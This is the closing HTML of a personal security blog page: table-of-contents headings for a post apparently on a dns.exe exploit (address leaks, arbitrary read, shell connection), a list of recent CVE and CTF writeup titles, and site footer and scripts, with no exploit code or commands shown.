class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%84%E6%BC%8F%E5%A0%86%E5%9C%B0%E5%9D%80%EF%BC%88%E7%9B%B8%E5%AF%B9%E5%9C%B0%E5%9D%80%EF%BC%89"><span class="toc-number">1.7.3.1.</span> <span class="toc-text">泄漏堆地址（相对地址）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2-dns-exe-%E5%9C%B0%E5%9D%80%EF%BC%88%E7%BB%9D%E5%AF%B9%E5%9C%B0%E5%9D%80%EF%BC%89"><span class="toc-number">1.7.3.2.</span> <span class="toc-text">泄露 dns.exe 地址（绝对地址）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96"><span class="toc-number">1.7.4.</span> <span class="toc-text">四、任意读取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8Eshell%E8%BF%9E%E6%8E%A5"><span class="toc-number">1.7.5.</span> <span class="toc-text">五、代码执行与shell连接</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08-exp%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">1.8.</span> <span class="toc-text">0x08 exp的利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x09-%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE"><span class="toc-number">1.9.</span> <span class="toc-text">0x09 参考文献</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/04/29/CVE-2022-0847%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/" title="CVE-2022-0847内核提权漏洞分析复现">CVE-2022-0847内核提权漏洞分析复现</a><time datetime="2022-04-29T06:35:35.696Z" title="Created 2022-04-29 14:35:35">2022-04-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/04/20/writeup-level3-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E5%8C%BA/" title="writeup-level3-攻防世界pwn新手区">writeup-level3-攻防世界pwn新手区</a><time datetime="2022-04-20T12:57:17.158Z" title="Created 2022-04-20 20:57:17">2022-04-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/04/17/CVE-2022-22965%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/" title="CVE-2022-22965漏洞分析复现">CVE-2022-22965漏洞分析复现</a><time datetime="2022-04-17T01:40:57.997Z" title="Created 2022-04-17 09:40:57">2022-04-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/04/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Csupersqli_writeup/" title="攻防世界supersqli_writeup">攻防世界supersqli_writeup</a><time datetime="2022-04-15T10:12:18.966Z" title="Created 2022-04-15 18:12:18">2022-04-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/04/14/SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/" title="sql注入笔记@Biscuit19">sql注入笔记@Biscuit19</a><time datetime="2022-04-14T14:10:59.715Z" title="Created 2022-04-14 22:10:59">2022-04-14</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By lhl_2507</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Local search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>